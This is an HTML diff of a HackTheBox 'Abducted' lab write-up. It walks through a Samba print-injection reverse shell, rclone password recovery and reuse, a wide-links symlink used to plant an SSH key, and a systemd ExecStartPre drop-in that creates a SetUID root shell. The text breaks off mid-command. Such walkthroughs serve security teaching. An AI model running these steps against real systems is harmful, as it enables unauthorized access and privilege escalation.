@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Abducted - HackTheBox writeup</title>
-<meta name="description" content="HackTheBox Abducted (Medium) - Samba print-subsystem command injection, credential reuse, wide-link abuse, and a systemd/polkit path to root.">
+<meta name="description" content="HackTheBox Abducted (Medium) - Samba print-subsystem command injection (CVE-2026-4480), rclone credential reuse, wide-link abuse to pivot users, and a systemd/polkit path to root.">
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -22,10 +22,6 @@
 
 <main class="wrap" style="padding-top:44px">
 
-  <!-- SCAFFOLD - you're mid-box. Fill each section from YOUR run (and your notes
-       template). Redact flag values. Swap the SCREENSHOT boxes for <figure>. The
-       section order below matches the intended chain so your notes drop straight in. -->
-
   <div class="wu-head">
     <img class="wu-icon" src="images/icons/abducted.png" alt="" onerror="this.style.display='none'">
     <h1>Abducted</h1>
@@ -38,16 +34,21 @@
     <span class="sep">|</span>
     <span>Linux &middot; Samba</span>
     <span class="sep">|</span>
-    <span class="prompt">date</span>
+    <span>20 Sep 2026</span>
   </div>
 
   <div class="tldr">
     <span class="lbl">tl;dr</span>
-    <p><span class="prompt">Write last. Shape: an unauthenticated Samba print-subsystem command
-    injection (CVE-2026-4480) gives a shell as nobody; an rclone backup config holds an obfuscated
-    password that decodes and is reused for scott; scott owns a wide-links Samba share that runs as
-    marcus, abused to plant an SSH key and become marcus; marcus can restart smbd via a systemd
-    drop-in + polkit rule, abused with ExecStartPre to make a SetUID bash and get root.</span></p>
+    <p>Abducted is built around the on-premise file and print server of a professional-services firm.
+    An unauthenticated Samba print-subsystem command injection (CVE-2026-4480) passes a client-supplied
+    print-job name to the shell unescaped and lands a shell as <code>nobody</code>. From there an
+    <code>rclone</code> offsite-backup config holds an obfuscated password that decodes with rclone's
+    own tooling and turns out to be reused for <code>scott</code>. A second Samba share configured with
+    <code>force user = marcus</code> and <code>wide links = yes</code> is abused to plant an SSH key in
+    marcus's home and log in as marcus. marcus belongs to a custom <code>operators</code> group that can
+    write the <code>smbd</code> systemd drop-in directory <em>and</em> is granted a no-auth
+    <code>daemon-reload</code> via a loose polkit rule - so an <code>ExecStartPre</code> drop-in makes a
+    SetUID bash and hands us root.</p>
   </div>
 
   <div class="tags">
@@ -56,80 +57,584 @@
     <a class="tag" href="vulns.html#priv-esc">priv-esc</a>
   </div>
 
+  <p style="margin-top:26px; color:var(--text-2);">
+    Abducted chains a handful of small Samba and Linux misconfigurations into a full compromise, and
+    not one of them needs a brute-force. Every step hands you exactly one credential or one capability,
+    and the box is really about asking "okay, where does <em>this</em> get me next?" It's also a nice
+    reminder to read the box name as a hint - by the end we're literally abducting <code>scott</code>,
+    then abducting <code>marcus</code>, then abducting <code>root</code>.
+  </p>
+
   <hr>
 
+  <!-- ==================== 01 ==================== -->
   <h2><span class="num">01</span>Enumeration</h2>
-  <p class="prompt">nmap (22/139/445), then SMB recon: null/guest session, share listing, and rpcclient
-  for users. Note the bait - weak password policy + no lockout are there to tempt a pointless brute.</p>
-  <pre><code><span class="p">$</span> nmap -p- --min-rate 10000 <span class="prompt">IP</span>
-<span class="p">$</span> smbclient -L //<span class="prompt">IP</span>/ -N          <span class="c"># HP-Reception, projects, transfer, IPC$</span>
-<span class="p">$</span> rpcclient -N <span class="prompt">IP</span> -U ""            <span class="c"># enumdomusers -> scott</span></code></pre>
-  <p class="prompt">Key realisation to write up: projects/transfer deny guest, and the printer share
-  is the only thing you can touch anonymously. That plus "box released straight to retired" points at
-  a recent Samba CVE, not a brute-force.</p>
+
+  <p>Starting with our humble scan, we find 3 open TCP ports:</p>
+
+  <pre><code><span class="p">$</span> nmap -sCV -p- -T4 <span class="o">10.129.244.177</span></code></pre>
+
+  <figure><img src="images/Abducted/abd1.png" alt="nmap scan showing three open TCP ports"><figcaption>Three open ports: 22 (SSH), 139 (NetBIOS), and 445 (SMB)</figcaption></figure>
+
+  <p>Ports 22 (SSH), 139 (NetBIOS) and 445 (SMB) are open. We can also see that the NetBIOS name is
+  <strong>Abducted</strong>. Usually with HTB, the name of the box is a big hint about the direction
+  it's going or how to progress - this is just a giant neon sign pointing us at the SMB service, so
+  let's see what the next guided step asks of us.</p>
+
+  <h3>The guest-accessible printer share</h3>
+
+  <p>We know from our scan that SMB is here, so let's use <code>smbclient</code> to see what we can find,
+  shall we?</p>
+
+  <pre><code><span class="p">$</span> smbclient -L //<span class="o">10.129.244.177</span> -N</code></pre>
+
+  <ul>
+    <li><code>-L</code> - list the available shares on the target.</li>
+    <li><code>-N</code> - suppress the password prompt (anonymous / null session).</li>
+  </ul>
+
+  <figure><img src="images/Abducted/abd2.png" alt="smbclient share listing showing HP-Reception printer share"><figcaption>The <code>HP-Reception</code> share, with <em>Printer</em> as its type</figcaption></figure>
+
+  <p>We see a share named <code>HP-Reception</code> with <em>Printer</em> as its type. Being able to list
+  it over an anonymous session already tells us the print subsystem is exposed - hold that thought.</p>
+
+  <h3>Identifying the CVE</h3>
+
+  <p>We should get a bit more information on our SMB target so we can identify the version and any
+  potential vulnerabilities before we go looking for exactly what CVE we're dealing with. Guided mode
+  holds your hand here, but it's useful to know how we'd do it ourselves - just seeing
+  <code>Samba smbd 4</code> from nmap isn't enough to pin down which vulnerability we're after.</p>
+
+  <p>A great tool for this is <a href="https://github.com/cddmp/enum4linux-ng" target="_blank"><code>enum4linux-ng</code></a>.
+  We can reach for it when one or more of these are true:</p>
+
+  <ul>
+    <li>SMB is accessible on 445/tcp</li>
+    <li>We want to check SMB over NetBIOS</li>
+    <li>SMB over NetBIOS is accessible on 139/tcp</li>
+  </ul>
+
+  <p>There are other tools we could use here - <code>netexec smb</code> (formerly CrackMapExec), or
+  <code>nmap -p445 --script "smb-os-discovery,smb-protocols,smb2-security-mode" &lt;IP&gt;</code> - but
+  let's stick with <code>enum4linux-ng</code> for this box because I like it.</p>
+
+  <h4>Installation</h4>
+
+  <p>It isn't on the HTB Pwnbox by default, so we install it first:</p>
+
+  <pre><code><span class="p">$</span> git clone https://github.com/cddmp/enum4linux-ng.git
+<span class="p">$</span> cd enum4linux-ng
+<span class="p">$</span> pip3 install -r requirements.txt</code></pre>
+
+  <h4>Run it against the target</h4>
+
+  <pre><code><span class="p">$</span> ./enum4linux-ng.py <span class="o">10.129.244.177</span> -A</code></pre>
+
+  <p><code>-A</code> means "do all simple enumeration" - it runs the following together:</p>
+
+  <ul>
+    <li>users (<code>-U</code>)</li>
+    <li>shares (<code>-S</code>)</li>
+    <li>groups (<code>-G</code>)</li>
+    <li>password policy (<code>-P</code>)</li>
+    <li>OS info (<code>-o</code>)</li>
+    <li>names / nmblookup (<code>-n</code>)</li>
+    <li>printer info (<code>-i</code>)</li>
+  </ul>
+
+  <h4>Analyze the results</h4>
+
+  <figure><img src="images/Abducted/adb3.png" alt="enum4linux-ng output part 1"><figcaption>enum4linux-ng output - shares and RPC</figcaption></figure>
+  <figure><img src="images/Abducted/adb4.png" alt="enum4linux-ng output part 2"><figcaption>enum4linux-ng output - users and server info</figcaption></figure>
+  <figure><img src="images/Abducted/adb5.png" alt="enum4linux-ng output part 3"><figcaption>enum4linux-ng output - printer / RPC section</figcaption></figure>
+  <figure><img src="images/Abducted/adb6.png" alt="enum4linux-ng output part 4"><figcaption>enum4linux-ng output - policy and OS summary</figcaption></figure>
+
+  <ul>
+    <li><strong><code>HP-Reception</code></strong> - type: Printer, "Reception printer", Mapping: OK. A printer
+    share you can map anonymously, and the RPC section confirms it again under "Printers." "Printers via
+    RPC" working means the box's print subsystem (the spooler) is exposed and answering RPC calls from an
+    unauthenticated session. On a Samba box, an exposed, mappable printer share is unusual and interesting.</li>
+    <li>The two disk shares (<code>projects</code>, <code>transfer</code>) come back Mapping: DENIED - they
+    need credentials we don't have yet. That's a note for post-foothold looting later.</li>
+    <li>User <code>scott</code> (Scott Mercer), RID 1000. We have his username, not his credentials. This
+    may be useful later.</li>
+    <li>The server-type string contains "Unx" (Unix) and the daemon is <code>smbd</code>, so we can be
+    confident this is Linux despite the "OS: Windows 7 / 6.1" line. That field comes from the SMB
+    protocol's self-reported OS value (via <code>srvinfo</code> / RPC), and it's simply whatever the
+    server chooses to announce - don't trust it.</li>
+  </ul>
+
+  <p>So what's unusual here that helps us look up the CVE? <strong>There's an exposed printer share we can
+  map anonymously.</strong> If we tailor a search around Samba, smbd 4, the print spooler and so on, we
+  should be able to find it. We could also lean on <code>searchsploit</code> to help (though it's offline,
+  so it can lag behind the latest CVEs).</p>
+
+  <p>A search for <em>"Samba print spooler command injection RCE 2026"</em> lands us on a
+  <a href="https://www.sentinelone.com/vulnerability-database/cve-2026-4480/" target="_blank">SentinelOne
+  vulnerability-database page</a> for <strong>CVE-2026-4480</strong>, filed under CWE-78 (OS command
+  injection). That fits our situation perfectly - we don't want to DoS anything, we want access.</p>
+
+  <div class="note insight">
+    <span class="lbl">CVE-2026-4480 - Samba print-spooler command injection</span>
+    Samba lets you define a <code>print command</code> that runs whenever a job is printed, and it
+    substitutes the client-supplied job description into that command via the <code>%J</code>
+    placeholder. The vulnerable code drops that job name straight into the shell <em>without escaping
+    shell metacharacters</em>. So an attacker who can submit a print job to a print share can name the
+    job with shell control characters, and the injected payload executes in the context of the Samba
+    print service - arbitrary command execution on the host. That's exactly why an anonymously-mappable
+    printer share was such a loud signal during recon.
+  </div>
 
   <hr>
 
-  <h2><span class="num">02</span>Foothold - CVE-2026-4480 (Samba print injection)</h2>
-  <p class="prompt">Explain the bug: the print-job name (%J) is passed to the shell unescaped. Show
-  connecting to HP-Reception anonymously and printing a file whose NAME is a shell payload. Confirm
-  execution with a ping, then swap for a reverse shell -> land as nobody.</p>
-  <div class="shot-todo">SCREENSHOT - reverse shell as nobody</div>
+  <!-- ==================== 02 ==================== -->
+  <h2><span class="num">02</span>Foothold - CVE-2026-4480</h2>
+
+  <figure><img src="images/Abducted/adb7.png" alt="SentinelOne CVE-2026-4480 page with proof-of-concept payload"><figcaption>The SentinelOne page and its proof-of-concept - promising</figcaption></figure>
+
+  <p>This payload looks promising. Let's copy the code into a Python script and let it rip. After
+  copying the exploit in, we point it at the target, give it our attack IP and a listener port, and
+  run it:</p>
+
+  <pre><code><span class="c"># start the listener first</span>
+<span class="p">$</span> nc -lvnp 4444
+
+<span class="c"># then fire the exploit (target, our IP, our port)</span>
+<span class="p">$</span> python3 exploit.py <span class="o">10.129.244.177 10.10.15.114 4444</span></code></pre>
+
+  <figure><img src="images/Abducted/adb8.png" alt="exploit.py running and confirming the print job was submitted"><figcaption>The exploit submits the malicious print job - "check your listener / out-of-band channel"</figcaption></figure>
+  <figure><img src="images/Abducted/adb9.png" alt="netcat listener catching a reverse shell as nobody"><figcaption>Shell caught - we land as <code>nobody</code> in <code>/var/spool/samba</code>. Spooky.</figcaption></figure>
+
+  <p>After copying the exploit, setting up a listener (<code>nc -lvnp 4444</code>), and running it... we
+  get a shell! We're currently a user called <code>nobody</code>. Spooky.</p>
+
+  <div class="note">
+    <span class="lbl">stabilize the shell</span>
+    A raw reverse shell as <code>nobody</code> is fragile - one stray Ctrl-C and it's gone. Upgrade to a
+    proper TTY before you start enumerating:
+    <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> then <code>export TERM=xterm</code>.
+  </div>
 
   <hr>
 
+  <!-- ==================== 03 ==================== -->
   <h2><span class="num">03</span>Lateral to scott - credential reuse</h2>
-  <p class="prompt">From nobody, enumerate the filesystem. Cover /opt/offsite-backup: the rclone.conf
-  with an obfuscated password, decoding it with <code>rclone reveal</code>, and reusing it for scott
-  (su / SSH). Grab user.txt (redacted).</p>
+
+  <p><code>id</code>, <code>hostname</code>, <code>sudo -l</code> and a few others were run as a cursory
+  glance at what we can see:</p>
+
+  <pre><code><span class="p">$</span> id      <span class="c"># uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)</span>
+<span class="p">$</span> hostname    <span class="c"># abducted</span></code></pre>
+
+  <figure><img src="images/Abducted/adb10.png" alt="id, hostname and basic enumeration as nobody"><figcaption><code>nobody</code> is about as low as it gets - uid 65534, no useful groups</figcaption></figure>
+
+  <p>Heading into <code>/home/</code> shows us two names: <code>scott</code> (which we saw earlier in
+  enum4linux-ng) and a new one, <code>marcus</code>. Our permissions are denied for both. <code>nobody</code>
+  has no path forward on its own, so the whole game now is finding a credential that gets us somewhere.</p>
+
+  <h3>Hunting for a readable secret</h3>
+
+  <p>Since we're a <code>nobody</code>, we need to find a config that's world-readable or group-readable
+  even though it holds a secret. <em>That</em> is our misconfiguration. Let's start with non-default
+  tools and binaries:</p>
+
+  <pre><code><span class="p">$</span> ls -la /usr/local/bin</code></pre>
+
+  <figure><img src="images/Abducted/adb13.png" alt="/usr/local/bin containing printaudit script"><figcaption><code>/usr/local/bin/printaudit</code> - the print-audit hook from the share config</figcaption></figure>
+
+  <p>We find a <code>printaudit</code> script, but there's nothing of worth inside - it just appends a
+  timestamped line to a log and exits. Good to check, then cross it off. On to <code>/opt</code>:</p>
+
+  <pre><code><span class="p">$</span> ls /opt        <span class="c"># offsite-backup</span>
+<span class="p">$</span> cd /opt/offsite-backup &amp;&amp; ls   <span class="c"># rclone.conf  sync.sh</span></code></pre>
+
+  <figure><img src="images/Abducted/adb14.png" alt="/opt/offsite-backup containing rclone.conf and sync.sh, with credentials visible"><figcaption><code>rclone.conf</code> - user <code>svc-backup</code> and an obscured password</figcaption></figure>
+
+  <p>Inside <code>/opt/offsite-backup</code> is an <code>rclone.conf</code>, and reading it turns up some
+  interesting finds: a user <code>svc-backup</code> and a long password. The format is a bit strange
+  though, isn't it? That's actually rclone's <em>obscured</em> version of the original password.</p>
+
+  <div class="note insight">
+    <span class="lbl">what is rclone (and why this file is a problem)</span>
+    rclone is a command-line tool for syncing and transferring files between a local machine and remote
+    storage - SFTP, S3, Google Drive, Dropbox, dozens of backends. Think "rsync for cloud storage."
+    Here it's pushing backups to an offsite SFTP host (<code>backup.hartley-group.internal</code>),
+    driven by the <code>sync.sh</code> we saw next to it. <code>rclone.conf</code> stores the credentials
+    for every remote it talks to - in our case the username and password for the backup service account.
+    The kicker: <strong>rclone's "obscure" is reversible obfuscation, not encryption.</strong> Anyone who
+    can read the config can recover the plaintext. So a world-readable config <em>plus</em> a password
+    that only looks protected means the credential is effectively sitting in the clear.
+  </div>
+
+  <p>The username the guided step is asking about is right there in the file: <strong><code>svc-backup</code></strong>.</p>
+
+  <h3>Decode it with rclone's own tooling</h3>
+
+  <p>We could keep looking around, but this is already juicy, so let's see if rclone is on the box - if
+  it is, we can have rclone deobfuscate its own config for us:</p>
+
+  <pre><code><span class="p">$</span> command -v rclone</code></pre>
+
+  <figure><img src="images/Abducted/adb15.png" alt="command -v rclone confirming rclone is installed"><figcaption><code>rclone</code> is present on the box</figcaption></figure>
+
+  <p>It's there. Now let's have it reveal its own obfuscated password. The <code>reveal</code> subcommand
+  just runs the reversible algorithm on whatever string you hand it - no config, no network, no key
+  exchange needed. That <em>is</em> the whole point of the "obscure isn't encryption" lesson:</p>
+
+  <pre><code><span class="p">$</span> rclone reveal 'HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw'</code></pre>
+
+  <figure><img src="images/Abducted/adb16.png" alt="rclone reveal returning the plaintext password"><figcaption><code>rclone reveal</code> hands back the plaintext</figcaption></figure>
+
+  <p>That looks deobfuscated to me. Now the instinct to build: this is a password for a <em>service</em>
+  account (<code>svc-backup</code>), not scott directly - but admins love to reuse a password they set
+  once. Could this be scott's password too? Let's test the reuse:</p>
+
+  <pre><code><span class="p">$</span> su scott      <span class="c"># paste the revealed password</span></code></pre>
+
+  <figure><img src="images/Abducted/adb17.png" alt="su scott succeeding with the revealed password"><figcaption>Password reuse confirmed - we are now <code>scott</code></figcaption></figure>
+
+  <p>Privilege-reuse success! Let's SSH in as scott for a more stable shell before we go further:</p>
+
+  <pre><code><span class="p">$</span> ssh scott@<span class="o">10.129.244.177</span></code></pre>
+
+  <figure><img src="images/Abducted/adb18.png" alt="SSH login as scott for a stable shell"><figcaption>Stable SSH session as <code>scott</code></figcaption></figure>
+
+  <p>And we grab the user flag from scott's home directory:</p>
+
+  <pre><code><span class="p">$</span> cat /home/scott/user.txt</code></pre>
+
+  <figure><img src="images/Abducted/adb19.png" alt="scott user.txt flag redacted"><figcaption>User flag - <code>/home/scott/user.txt</code> [redacted, no spoilers]</figcaption></figure>
 
   <hr>
 
+  <!-- ==================== 04 ==================== -->
   <h2><span class="num">04</span>Lateral to marcus - Samba wide-link abuse</h2>
-  <p class="prompt">Read /etc/samba/shares.conf: the transfer share is <code>valid users = scott</code>,
-  <code>force user = marcus</code>, <code>wide links = yes</code>. Explain why that's exploitable:
-  symlink /home/marcus into the share, access it over SMB as scott (running as marcus), drop an SSH
-  authorized_keys, and log in as marcus.</p>
+
+  <p>We got in through Samba, so why don't we go read the configuration to learn more about it? Start
+  with the main config:</p>
+
+  <pre><code><span class="p">$</span> cat /etc/samba/smb.conf</code></pre>
+
+  <figure><img src="images/Abducted/adb11.png" alt="/etc/samba/smb.conf showing allow insecure wide links = yes and unix extensions = no"><figcaption><code>smb.conf</code> - <code>allow insecure wide links = yes</code> and <code>unix extensions = no</code></figcaption></figure>
+
+  <p>We see that <code>allow insecure wide links</code> is set to <code>yes</code>, and just above it
+  <code>unix extensions</code> is set to <code>no</code>. These two matter together, because wide links
+  only work when unix extensions are off. In other words, Samba is configured to follow symlinks that
+  point <em>outside</em> a share's directory. If we can write a symlink into a share, we can potentially
+  read (or write) files the share was never meant to expose. There's also an
+  <code>include = /etc/samba/shares.conf</code>, so let's look at that too:</p>
+
+  <pre><code><span class="p">$</span> cat /etc/samba/shares.conf</code></pre>
+
+  <figure><img src="images/Abducted/adb12.png" alt="/etc/samba/shares.conf showing the transfer share with force user marcus and wide links"><figcaption>The <code>[transfer]</code> share - <code>valid users = scott</code>, <code>force user = marcus</code>, <code>wide links = yes</code></figcaption></figure>
+
+  <p>The <code>[transfer]</code> share is the crown jewel. Three options stack up on it:</p>
+
+  <ul>
+    <li><code>valid users = scott</code> - we need to authenticate as scott to touch it (which we can).</li>
+    <li><code>force user = marcus</code> - but once we're in, every file operation runs as <strong>marcus</strong>.
+    So we'd read and write with marcus's permissions even though we logged in as scott.</li>
+    <li><code>wide links = yes</code> - and we can follow symlinks out of <code>/srv/transfer</code> to
+    anywhere on the box.</li>
+  </ul>
+
+  <p>Chain those together and the plan becomes: authenticate as <strong>scott</strong> &rarr; operate as
+  <strong>marcus</strong> &rarr; symlink our way <em>out</em> of the share &rarr; read/write whatever
+  marcus can. (Seems like we'd be abducting marcus by first abducting scott, no? Clever box name.) These
+  answer two guided questions in one go: the directive that lets the transfer share follow symlinks
+  outside itself is <strong><code>wide links</code></strong>, and the user all file operations are forced
+  to run as is <strong><code>marcus</code></strong>.</p>
+
+  <h3>Planting the symlink</h3>
+
+  <p>To break out of the share we need a symlink <em>inside</em> it that points to where we actually want
+  to go - marcus's home. So how do we plant it? Normally you'd create it over SMB with smbclient's
+  <code>symlink</code> command, but that relies on SMB unix extensions, and we just saw
+  <code>unix extensions = no</code> in <code>smb.conf</code>. So the smbclient <code>symlink</code>
+  command is off the table - we have to plant the symlink on the filesystem instead, which is fine
+  because we have a local shell as scott.</p>
+
+  <p>The two-part trick:</p>
+
+  <ul>
+    <li><strong>Plant the symlink from the scott shell</strong> (the on-disk side): drop a symlink inside
+    <code>/srv/transfer</code> that points out to <code>/home/marcus</code> (you could link to <code>/</code>
+    if you want to roam the whole filesystem).</li>
+    <li><strong>Write through it over SMB</strong> (the force-user side): because <code>[transfer]</code>
+    is <code>force user = marcus</code>, anything we <code>put</code> via smbclient lands owned by marcus,
+    and wide links lets the server follow our symlink out of the share into marcus's <code>.ssh</code>.
+    That's how we write an <code>authorized_keys</code> into a home directory we otherwise can't touch.</li>
+  </ul>
+
+  <p>Let's not get ahead of ourselves - first confirm it's even possible. Connect to the share as scott:</p>
+
+  <pre><code><span class="p">$</span> smbclient //localhost/transfer -U scott</code></pre>
+
+  <figure><img src="images/Abducted/adb23.png" alt="smbclient connected to the transfer share as scott"><figcaption>Connected to <code>[transfer]</code> as scott</figcaption></figure>
+
+  <p>From the <code>smb: \&gt;</code> prompt, smbclient lets us shell out to a local command with
+  <code>!</code>, which runs as scott. Check whether scott can write into the share directory on disk:</p>
+
+  <pre><code>smb: \&gt; !ls -ld /srv/transfer</code></pre>
+
+  <figure><img src="images/Abducted/adb24.png" alt="ls -ld on /srv/transfer showing scott owns it"><figcaption><code>/srv/transfer</code> is owned by scott with <code>rwx</code> - so scott can write there directly</figcaption></figure>
+
+  <p>scott owns it (<code>scott scott</code>) with <code>rwx</code>, so we can plant our symlink. Point
+  it at marcus's home:</p>
+
+  <pre><code>smb: \&gt; !ln -s /home/marcus /srv/transfer/pwn</code></pre>
+
+  <figure><img src="images/Abducted/adb25.png" alt="cd pwn over SMB revealing marcus home directory contents"><figcaption><code>cd pwn</code> follows the symlink out of the share - we're now looking at marcus's home</figcaption></figure>
+
+  <p>We make a link called <code>pwn</code>, and when we <code>cd</code> into it over SMB we're shown
+  marcus's home directory contents - files that physically live <em>outside</em> the share. The
+  containment break worked, and because of <code>force user</code> everything we do here runs as marcus.
+  Time to abduct marcus.</p>
+
+  <h3>Drop an SSH key and log in as marcus</h3>
+
+  <p>There's no <code>.ssh</code> in marcus's home yet, so we'll create one and drop our public key into
+  it. Generate the keypair locally via smbclient's <code>!</code> shell-out, then upload the public half
+  as <code>authorized_keys</code>:</p>
+
+  <pre><code><span class="c"># 1. make a keypair (no passphrase) in /tmp</span>
+smb: \&gt; !ssh-keygen -t ed25519 -f /tmp/mkey -N ""
+
+<span class="c"># 2. stage it as an authorized_keys file</span>
+smb: \&gt; !cp /tmp/mkey.pub /tmp/authorized_keys
+
+<span class="c"># 3. back at the SMB layer, inside marcus's home: create .ssh and upload</span>
+smb: \&gt; mkdir .ssh
+smb: \&gt; cd .ssh
+smb: \&gt; put /tmp/authorized_keys authorized_keys</code></pre>
+
+  <div class="note">
+    <span class="lbl">why sshd accepts it</span>
+    Because the share force-users to marcus, the new <code>.ssh</code> directory and
+    <code>authorized_keys</code> file are owned by <strong>marcus</strong>. Samba's default masks
+    (directory <code>0755</code>, file <code>0744</code>) mean no group/other write, which satisfies
+    sshd's StrictModes check - so sshd will happily read the key. Run each smbclient command one at a
+    time; pasting several at once can jumble the filenames.
+  </div>
+
+  <p>Now log in as marcus with the private key, from the scott shell or a fresh terminal:</p>
+
+  <pre><code><span class="p">$</span> ssh -i /tmp/mkey marcus@localhost</code></pre>
+
+  <figure><img src="images/Abducted/adb26.png" alt="SSH login as marcus succeeds"><figcaption>Success - we are now <code>marcus</code></figcaption></figure>
 
   <hr>
 
+  <!-- ==================== 05 ==================== -->
   <h2><span class="num">05</span>Privilege escalation to root - systemd drop-in + polkit</h2>
-  <p class="prompt">marcus is in the <code>operators</code> group, which owns the
-  <code>smbd.service.d</code> drop-in dir and (via a polkit rule) can restart smbd. Write an
-  <code>ExecStartPre</code> that copies bash to a SetUID binary, reload + restart smbd, run the SetUID
-  bash with <code>-p</code> -> root. Redact root.txt.</p>
-  <div class="shot-todo">SCREENSHOT - id showing uid=0 and redacted root proof</div>
+
+  <p>First, what does marcus have that scott didn't? Check his groups:</p>
+
+  <pre><code><span class="p">$</span> id marcus   <span class="c"># uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)</span></code></pre>
+
+  <figure><img src="images/Abducted/adb20.png" alt="id marcus showing membership of the operators group"><figcaption>marcus is in a non-standard group: <code>operators</code> (gid 1000)</figcaption></figure>
+
+  <p>The sore thumb sticking out is group <code>1000</code>, <strong><code>operators</code></strong>.
+  Everything else is just marcus's own personal group; <code>operators</code> is the custom one a sysadmin
+  created on purpose, and standard installs don't ship it. So what does this group actually let marcus
+  do? A group only matters for what it owns or can write, so let's map its reach:</p>
+
+  <pre><code><span class="p">$</span> find / -group operators 2>/dev/null</code></pre>
+
+  <p>This walks the filesystem from <code>/</code> and keeps only files whose <em>group owner</em> is
+  <code>operators</code> - and the <code>2>/dev/null</code> on the end throws all the "Permission denied"
+  noise in the trash so we only see real hits.</p>
+
+  <figure><img src="images/Abducted/adb21.png" alt="find results showing operators group owns the smbd.service.d directory"><figcaption><code>/etc/systemd/system/smbd.service.d</code> - a directory the <code>operators</code> group owns</figcaption></figure>
+
+  <p>The hit is <strong><code>/etc/systemd/system/smbd.service.d</code></strong> - the drop-in directory
+  for the <code>smbd</code> unit, and <code>smbd</code> runs as <strong>root</strong>. We're getting close.
+  The idea forming is: drop in a snippet that makes <code>smbd</code> execute something as root, have
+  systemd pick it up, and restart <code>smbd</code>. The hard part is the middle step - telling systemd to
+  reload normally needs root auth... unless a polkit rule says otherwise.</p>
+
+  <div class="note insight">
+    <span class="lbl">what polkit is, and actions vs. rules</span>
+    polkit (formerly PolicyKit) is the authorization layer that sits between unprivileged processes and
+    privileged system services on Linux. When you're not root but try to do something privileged, the
+    tool asks a system daemon (<code>polkitd</code>) whether you're allowed. polkit answers yes, no, or
+    "yes, after you authenticate" - that "authentication required, enter your password" prompt on Linux
+    is polkit. It lets an admin grant fine-grained privileged capabilities to specific users or groups
+    <em>without</em> handing them full root or a sudo entry - and that flexibility is exactly what makes
+    it a privesc surface when it's configured too loosely.
+    <br><br>
+    A polkit <strong>action</strong> is a single named privileged operation, written in reverse-DNS form.
+    systemd ships a fixed catalog of them (in
+    <code>/usr/share/polkit-1/actions/org.freedesktop.systemd1.policy</code>):
+    <code>org.freedesktop.systemd1.manage-units</code> (start/stop/restart units),
+    <code>org.freedesktop.systemd1.manage-unit-files</code> (enable/disable), and
+    <code>org.freedesktop.systemd1.reload-daemon</code> (reload the manager, i.e. <code>daemon-reload</code>).
+    A polkit <strong>rule</strong> is the policy that decides the outcome for a given action and subject
+    (user/group), returning <code>YES</code>, <code>NO</code>, or an auth challenge. If a rule returns
+    <code>YES</code> for a systemd action to a non-admin group like <code>operators</code>, that group can
+    drive systemd without a password.
+  </div>
+
+  <p>So the polkit action the guided step is asking about - the one that lets marcus reload the systemd
+  manager without authentication - is <strong><code>org.freedesktop.systemd1.reload-daemon</code></strong>.
+  We know the <em>name</em> from systemd's action catalog above (the phrase "reload the manager" maps to
+  exactly one action), and we'll prove it's actually ungated in a moment by just running it.</p>
+
+  <h3>Confirm the pieces before committing</h3>
+
+  <p>Group <em>ownership</em> isn't the same as group <em>write permission</em> - a directory can be
+  <code>operators</code>-owned but still <code>750</code> (no group write). So verify:</p>
+
+  <pre><code><span class="p">$</span> ls -ld /etc/systemd/system/smbd.service.d</code></pre>
+
+  <figure><img src="images/Abducted/adb22.png" alt="ls -ld showing drwxrws--- with operators group write and setgid"><figcaption><code>drwxrws---</code> - the <code>operators</code> group has <code>rwx</code> (write confirmed), and the setgid bit is set</figcaption></figure>
+
+  <p>Reading the group triad <code>drwxrws---</code>: <code>operators</code> has <code>rws</code>, so the
+  <code>w</code> is there - any member of the group (marcus) can write into this directory. The trailing
+  <code>s</code> is the setgid bit, so any file marcus creates here inherits the <code>operators</code>
+  group. And <code>other</code> is <code>---</code>, which is our independent confirmation that scott
+  couldn't even enter this directory - becoming marcus wasn't optional, it was structurally required.</p>
+
+  <p>That gives us a fully verified chain, everything but the empirical polkit check:</p>
+
+  <ul>
+    <li>marcus is in <code>operators</code> (<code>id marcus</code>) &check;</li>
+    <li><code>operators</code> can write the <code>smbd</code> drop-in dir (<code>ls -ld</code>) &check;</li>
+    <li><code>smbd</code> runs as root (from <code>ps aux</code> earlier) &check;</li>
+    <li>marcus can <code>daemon-reload</code>/restart without auth - prove it now that we're marcus.</li>
+  </ul>
+
+  <h3>Fire the chain</h3>
+
+  <p>Confirm we're marcus and cash the empirical polkit check:</p>
+
+  <pre><code><span class="p">$</span> id
+<span class="p">$</span> systemctl daemon-reload</code></pre>
+
+  <figure><img src="images/Abducted/adb27.png" alt="daemon-reload as marcus returning with no authentication prompt"><figcaption>No password prompt, no "authentication required" - <code>reload-daemon</code> really is ungated for marcus</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">how we knew to reach for daemon-reload (and how it proves the finding)</span>
+    systemd keeps every unit definition loaded <em>in memory</em>. It reads the unit files and drop-ins
+    once, then never re-reads them on its own - you can drop a new file into a <code>service.d/</code>
+    directory and systemd will keep running the old cached version, oblivious. <code>daemon-reload</code>
+    is the command that forces it to re-scan from disk and rebuild that in-memory picture; the
+    <em>next</em> start/restart then uses the updated definition. That's why our attack sequence has to
+    be plant &rarr; reload &rarr; restart: without the reload, the restart just re-runs the harmless
+    original.
+    <br><br>
+    We also knew to reach for it because the box told us - the whole point of the loose polkit rule is
+    to ungate <code>reload-daemon</code>, and a box only bothers ungating an action when that action is a
+    required step in the intended path. As for proving it: run it as a non-root user and watch how
+    systemd reacts. A silent success (no auth prompt, exit code 0) means polkit answered
+    <code>YES</code> - ungated. A password prompt or an "Interactive authentication required" error means
+    it's gated. A normal box would gate <code>daemon-reload</code> every time, so the silent success is
+    the observable fingerprint of the misconfigured rule - we're watching the vulnerability behave, not
+    just theorizing it.
+  </div>
+
+  <p>Now plant a drop-in that makes <code>smbd</code> (root) run our command. Rather than SetUID-ing the
+  system bash directly (noisy - it changes a core binary), we copy one off to a private SetUID shell,
+  which is cleaner hygiene and easier to clean up afterward:</p>
+
+  <pre><code><span class="p">$</span> printf '[Service]\nExecStartPre=/bin/cp /bin/bash /tmp/rootbash\nExecStartPre=/bin/chmod 4755 /tmp/rootbash\n' > /etc/systemd/system/smbd.service.d/pwn.conf</code></pre>
+
+  <p>Then load it and trigger it:</p>
+
+  <pre><code><span class="p">$</span> systemctl daemon-reload
